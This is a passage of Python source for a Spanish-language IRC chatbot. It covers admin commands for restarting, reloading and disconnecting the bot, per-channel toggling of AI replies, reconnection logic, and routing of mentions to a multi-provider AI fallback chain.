                safepm(channel, f"\x0304⛔ {nick}: Solo admins.\x03")
                return
            if history_clear(channel):
                safepm(channel, f"\x0303✅ Historial limpiado para {channel}.\x03")
            else:
                safepm(channel, "\x0310ℹ️ Sin historial.\x03")
            return

        if cleaned_message.strip().lower() == "!reload":
            if nick not in admin_nicks:
                safepm(channel, f"\x0304⛔ {nick}: Solo admins.\x03")
                return
            config.read(CONF_FILE)
            reload_channel_topics()
            safepm(channel, f"\x0303✅ Configuración recargada. Temas: {', '.join(channel_topics.keys()) or 'ninguno'}\x03")
            print(f"[RELOAD] Conf recargado por {nick}")
            return

        if cleaned_message.strip().lower() == "!restart":
            if nick not in admin_nicks:
                safepm(channel, f"\x0304⛔ {nick}: Solo admins.\x03")
                return
            safepm(channel, "\x0310🔄 Reiniciando bot...\x03")
            time.sleep(1)
            try:
                client.quit("Reiniciando...")
            except Exception:
                pass
            print(f"[RESTART] Reinicio solicitado por {nick}")
            os.execv(sys.executable, [sys.executable] + sys.argv)
            return

        if cleaned_message.strip().lower() == "!disconnect":
            if nick not in admin_nicks:
                safepm(channel, f"\x0304⛔ {nick}: Solo admins.\x03")
                return
            safepm(channel, "\x0310🔌 Desconectando bot...\x03")
            time.sleep(1)
            try:
                client.quit("Desconectado por administrador")
            except Exception:
                pass
            print(f"[DISCONNECT] Desconexión solicitada por {nick}")
            sys.exit(0)
            return

        pattern = rf"\b{re.escape(nickname)}\b"
        if re.search(pattern, cleaned_message, re.IGNORECASE):
            message = re.sub(pattern, "", cleaned_message, flags=re.IGNORECASE).strip()

            clima_resp = _responder_clima(nick, channel, cleaned_message)
            if clima_resp:
                safepm(channel, clima_resp)
                print(f"[Clima] {nick} -> {clima_resp[:60]}...")
                return

            threading.Thread(
                target=process_ai_response,
                args=(client, channel, channel, message),
                daemon=True,
            ).start()

    except Exception as e:
        print(f"Error en on_message: {e}")

def on_privmsg(client, event) -> None:
    try:
        nick = irc.client.NickMask(event.source).nick
        if nick not in admin_nicks:
            return

        raw = strip_mirc_colors(event.arguments[0]).strip()
        cmd = raw.lower()

        if cmd.startswith("ia "):
            parts = raw.split()
            if len(parts) < 3:
                safepm(nick, "\x0302Uso: ia <#canal> <on|off|status>\x03")
                return
            canal  = parts[1] if parts[1].startswith("#") else f"#{parts[1]}"
            accion = parts[2].lower()
            if accion == "on":
                channel_states[canal.lower()] = True
                _save_channel_states()
                safepm(nick, f"\x0303✅ Bot activado en {canal}.\x03")
                print(f"[IA] Bot activado en {canal} por {nick}")
            elif accion == "off":
                channel_states[canal.lower()] = False
                _save_channel_states()
                client.privmsg(nick, f"\x0304🔇 Bot desactivado en {canal}.\x03")
                print(f"[IA] Bot desactivado en {canal} por {nick}")
            elif accion == "status":
                estado = "✅ activo" if is_channel_active(canal.lower()) else "🔇 desactivado"
                safepm(nick, f"\x0302ℹ️ {canal}: {estado}\x03")
            else:
                safepm(nick, "\x0302Uso: ia <#canal> <on|off|status>\x03")
            return

        if cmd.startswith("olvida"):
            parts = raw.split()
            if len(parts) < 2:
                safepm(nick, "\x0302Uso: olvida <#canal>\x03")
                return
            canal = parts[1] if parts[1].startswith("#") else f"#{parts[1]}"
            if history_clear(canal):
                safepm(nick, f"\x0303✅ Historial limpiado para {canal}.\x03")
            else:
                safepm(nick, f"\x0310ℹ️ Sin historial para {canal}.\x03")
            return

        if cmd.startswith("autojoin"):
            handle_autojoin_command(client, event, raw)
            return

        if cmd == "reload":
            config.read(CONF_FILE)
            reload_channel_topics()
            safepm(nick, f"\x0303✅ Conf recargado. Temas activos: {', '.join(channel_topics.keys()) or 'ninguno'}\x03")
            return

        if cmd == "restart":
            safepm(nick, "\x0310🔄 Reiniciando bot...\x03")
            time.sleep(1)
            try:
                client.quit("Reiniciando...")
            except Exception:
                pass
            print(f"[RESTART] Reinicio solicitado por {nick}")
            os.execv(sys.executable, [sys.executable] + sys.argv)
            return

        if cmd == "disconnect":
            safepm(nick, "\x0310🔌 Desconectando bot...\x03")
            time.sleep(1)
            try:
                client.quit("Desconectado por administrador")
            except Exception:
                pass
            print(f"[DISCONNECT] Desconexión solicitada por {nick}")
            sys.exit(0)
            return

        if cmd == "ayuda":
            msgs = [
                "\x0302📘 Comandos disponibles (solo admins, por PM):\x03",
                "\x0303• ia <#canal> on\x0302 – Activar el bot en un canal",
                "\x0303• ia <#canal> off\x0302 – Desactivar el bot en un canal",
                "\x0303• ia <#canal> status\x0302 – Ver estado del bot en un canal",
                "\x0303• olvida <#canal>\x0302 – Limpiar historial de conversación",
                "\x0303• autojoin add/del/list/info/addall/rejoin\x0302 – Gestión de canales",
                "\x0303• reload\x0302 – Recargar temáticas del conf sin reiniciar",
                "\x0303• restart\x0302 – Reiniciar el bot completamente (recarga todo)",
                "\x0303• disconnect\x0302 – Desconectar el bot del IRC (requiere reinicio manual)",
                "\x0303• ayuda\x0302 – Mostrar este mensaje",
            ]
            for m in msgs:
                safepm(nick, m)
            return

    except Exception as e:
        print(f"Error en on_privmsg: {e}")

def on_disconnect(client, event) -> None:
    global reconnecting
    if shutdown:
        return
    if not reconnecting:
        reconnecting = True
        threading.Thread(target=intentar_reconectar, daemon=True).start()

client = None

def conectar() -> None:
    global client, reconnecting
    reactor = irc.client.Reactor()
    try:
        client = reactor.server().connect(
            server, port, nickname,
            ircname=realname, username=ident
        )
        reconnecting = False
        print(
            f"✅ Conectado al servidor IRC\n"
            f"   Servidor: {server}:{port}\n"
            f"   Fallback chain: Gemini → OpenRouter → Groq → DeepSeek"
        )

        def on_welcome(client, event) -> None:
            if password:
                client.privmsg("NiCK", f"IDENTIFY {password}")
            if user_modes:
                client.send_raw(f"MODE {nickname} {user_modes}")
            target_channels = ["#boxitos"] if STAGING_MODE else channels
            for channel in target_channels:
                client.join(channel); notify_telegram(f"🏠 Unido al canal: {channel}")

            def _do_autojoin() -> None:
                if STAGING_MODE: return
                time.sleep(3)
                for canal in autojoin_channels:
                    try:
                        client.join(canal)
                        print(f"[AUTOJOIN] Unido a {canal}")
                    except Exception as e:
                        print(f"[AUTOJOIN] Error al entrar a {canal}: {e}")

            threading.Thread(target=_do_autojoin, daemon=True).start()

        def on_error(client, event) -> None:
            print(f"[ERROR SERVER] {event.arguments[0] if event.arguments else 'sin detalle'}")

        def on_pong(client, event) -> None:
            pass

        def keepalive_ping() -> None:
            global client, reconnecting
            while not shutdown:
                time.sleep(60)
                if client and not reconnecting:
                    try:
                        client.send_raw("PING " + server)
                    except Exception:
                        break

        client.add_global_handler("welcome",    on_welcome)
        client.add_global_handler("error",      on_error)
        client.add_global_handler("disconnect", on_disconnect)
        client.add_global_handler("pong",       on_pong)
        client.add_global_handler("pubmsg",     on_message)
        client.add_global_handler("privmsg",    on_privmsg)

        threading.Thread(target=keepalive_ping, daemon=True).start()

        reactor.process_forever()

        if not shutdown and not reconnecting:
            print("[MiLeNiUm] Conexion perdida — intentando reconectar...")
            reconnecting = True
            threading.Thread(target=intentar_reconectar, daemon=True).start()

    except KeyboardInterrupt:
        raise
    except Exception as e:
        print(f"Error al intentar conectar: {e}")
        reconnecting = True
        threading.Thread(target=intentar_reconectar, daemon=True).start()

def intentar_reconectar() -> None:
    global reconnecting
    delay = 10
    while reconnecting and not shutdown:
        print(f"Reconectando en {delay} segundos...")
        time.sleep(delay)
        try:
            conectar()
            return
        except Exception as e:
            print(f"Error al reconectar: {e}")

if __name__ == "__main__":
    irc.client.ServerConnection.buffer_class = buffer.LenientDecodingLineBuffer
    print("[MiLeNiUm] Iniciando con IA multi-proveedor...")
    print("[MiLeNiUm] Fallback chain: Mistral -> OpenRouter -> Groq -> DeepSeek -> Gemini")
    try:
        conectar()
    except KeyboardInterrupt:
        shutdown = True
        print("\n[MiLeNiUm] Bot detenido por el usuario.")
